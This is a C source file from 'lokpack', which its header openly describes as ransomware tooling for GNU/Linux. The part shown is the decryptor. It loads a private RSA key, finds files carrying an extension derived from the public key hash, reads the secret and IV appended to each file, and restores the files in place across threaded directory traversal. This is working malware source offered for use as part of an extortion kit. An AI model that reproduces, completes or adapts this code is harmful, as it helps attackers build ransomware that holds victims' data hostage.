/*

 * lokpack | ransomware tooling for GNU/Linux
 * written by ngn (https://ngn.tf) (2025)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include "lib/traverse.h"
#include "lib/config.h"
#include "lib/util.h"
#include "lib/rsa.h"
#include "lib/log.h"

#include <openssl/evp.h>
#include <sys/stat.h>

#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include <fcntl.h>
#include <stdio.h>

/* shared handler data */
static bool quit = false;             /* should we quit? */
static char pub_hash[LP_SHA256_SIZE]; /* public key hash */
static char pub_ext[7] = {0}; /* file extension (calculated from hash) */

void signal_handler(int signal) {
  (void)signal; /* unused */

  lp_info("Stopping the program, wait for ongoing operations");
  lp_traverser_stop();
  quit = true;
}

void decrypt_handler(char *path) {
  bool     ret = false;
  lp_rsa_t rsa;

  uint8_t out_buf[LP_RSA_BLOCK_SIZE];
  uint8_t in_buf[LP_RSA_BLOCK_SIZE];

  /* file stuff */
  int   fd = -1, in_len = 0, out_len = 0;
  off_t size = -1, write_pos = 0, read_pos = 0;

  /* path stuff */
  int   new_path_len = strlen(path) - sizeof(pub_ext);
  char *new_path     = calloc(1, new_path_len + 1);

  /* initialize RSA structure with the private key */
  lp_rsa_init(&rsa);

  /* decrypted file path */
  memcpy(new_path, path, new_path_len);

  /* open the input file */
  if ((fd = open(path, O_RDWR)) < 0) {
    lp_debug("Failed to open file %s: %s", new_path, lp_str_error());
    goto free;
  }

  /* read the secret and the IV */
  if ((size = lseek(
           fd, (off_t)(sizeof(rsa.secret) + sizeof(rsa.iv)) * -1, SEEK_END)) <
      0) {
    lp_debug("Failed to seek to the start of secret in %s: %s",
        path,
        lp_str_error());
    goto free;
  }

  if (read(fd, rsa.secret, sizeof(rsa.secret)) <= 0) {
    lp_debug("Failed to read the secret from %s: %s", path, lp_str_error());
    goto free;
  }

  if (read(fd, rsa.iv, sizeof(rsa.iv)) <= 0) {
    lp_debug("Failed to read the IV from %s: %s", path, lp_str_error());
    goto free;
  }

  if (lseek(fd, 0, SEEK_SET) != 0) {
    lp_debug("Failed to seek to the start of %s: %s", path, lp_str_error());
    goto free;
  }

  /* load the RSA decryption context */
  if (!lp_rsa_load(&rsa)) {
    lp_debug("Failed to load the RSA context");
    goto free;
  }

  /* read from the input file, one block at a time */
  while (
      (in_len = read(fd,
           in_buf,
           (off_t)sizeof(in_buf) > size ? (size_t)size : sizeof(in_buf))) > 0) {
    /* decrease the remaining size (don't accidentally read the secret and IV */
    size -= in_len;

    /* WARN: read_pos is not updated until the write(), be careful using it */

    /* decrypt the full/partial block */
    if (!lp_rsa_decrypt(&rsa, in_buf, in_len, out_buf, &out_len)) {
      lp_debug("Failed to decrypt %s (%lu, %lu)", path, in_len, out_len);
      goto free;
    }

    /* check the input/output block size */
    if (out_len > in_len && size > 0) {
      lp_debug("Invalid block size for %s: %d > %d", path, out_len, in_len);
      goto free;
    }

    /* go back to the writing position */
    if (lseek(fd, write_pos, SEEK_SET) != write_pos) {
      lp_debug(
          "Failed to seek to writing pos for %s: %s", path, lp_str_error());
      goto free;
    }

    /* write the decrypted full block to the output file */
    if (out_len != 0 && write(fd, out_buf, out_len) <= 0) {
      lp_debug("Failed to write output to %s: %s", path, lp_str_error());
      goto free;
    }

    /* update the reading & writing position */
    read_pos += in_len;
    write_pos += out_len;

    /* go back to the reading position */
    if (lseek(fd, read_pos, SEEK_SET) != read_pos) {
      lp_debug(
          "Failed to seek to reading pos for %s: %s", path, lp_str_error());
      goto free;
    }

    /* check if we read the last block */
    if (size <= 0)
      break;
  }

  /* decrypt any leftover partial block */
  if (!lp_rsa_done(&rsa, out_buf, &out_len)) {
    lp_debug("Failed to decrypt the last block");
    goto free;
  }

  /* check if the block is empty (no need to waste time if that's the case) */
  if (out_len > 0) {
    /* restore to the last write position */
    if (lseek(fd, write_pos, SEEK_SET) != write_pos) {
      lp_debug(
          "Failed to seek to writing pos for %s: %s", path, lp_str_error());
      goto free;
    }

    /* write the last block */
    if (write(fd, out_buf, out_len) < 0) {
      lp_debug("Failed to write last block to %s: %s", path, lp_str_error());
      goto free;
    }
  }

  /* remove remaining block data, secret and IV */
  if (ftruncate(fd, write_pos + out_len) != 0) {
    lp_debug("Failed to truncate %s: %s", path, lp_str_error());
    goto free;
  }

  /* close the file */
  close(fd);
  fd = -1;

  /* rename the file */
  if (rename(path, new_path) != 0) {
    lp_debug("Failed to rename file %s to %s", path, new_path);
    goto free;
  }

  ret = true;

free:
  if (fd >= 0)
    close(fd);

  if (!ret)
    lp_fail("Failed to decrypt %s", path);

  free(new_path);
  lp_rsa_free(&rsa);
}

int main(int argc, char *argv[]) {
  struct sigaction action;  /* signal action */
  char            *exts[2]; /* target extension list */
  int              i, code = EXIT_FAILURE;

  if (argc <= 1) {
    lp_info("Usage: %s [DIR/FILE]...", argv[0]);
    goto end;
  }

  /* setup the signal handler */
  sigemptyset(&action.sa_mask);
  action.sa_handler = signal_handler;
  action.sa_flags   = 0;

  sigaction(SIGINT, &action, NULL);
  sigaction(SIGTERM, &action, NULL);
  sigaction(SIGQUIT, &action, NULL);

  /* load the private RSA key */
  if (!lp_rsa_key_load()) {
    lp_fail("Failed to load the private key, is the key valid?");
    goto end;
  }

  /* calculate the public key hash and the extension for the encrypted files */
  if (NULL == lp_sha256(LP_PUBKEY, pub_hash)) {
    lp_fail("Failed to calculate hash of the public key");
    goto end;
  }

  if (snprintf(pub_ext, sizeof(pub_ext), "%.6s", pub_hash) !=
      (int)sizeof(pub_ext) - 1) {
    lp_fail("Failed to format the encrypted file extension");
    goto end;
  }

  /* setup the traverser */
  exts[0] = pub_ext;
  exts[1] = NULL;

  /*

   * initialize the traverser to find encrypted files (files with pub_ext) and
   * decrypt them using the decrypt_handler()

  */
  if (!lp_traverser_init(LP_THREADS, exts, NULL)) {
    lp_fail("Failed to initialize traverser: %s", lp_str_error());
    goto end;
  }

  lp_traverser_set_mode(R_OK | W_OK);
  lp_traverser_set_handler(decrypt_handler);

  /* traverse & decrypt all the specified dirs/files */
  for (i = 1; !quit && i < argc; i++) {
    lp_info("Decrypting %s", argv[i]);
    lp_traverser_run(argv[i]);
  }

  /* wait for all the threads */
  lp_traverser_wait(true);

  /* check if we quit */
  if (quit)
    goto end;

  lp_success("Operation completed");
  code = EXIT_SUCCESS;

end:
  /* free resources */
  lp_traverser_free();
  lp_rsa_key_free();

  /* return with the exit code */
  return code;
}
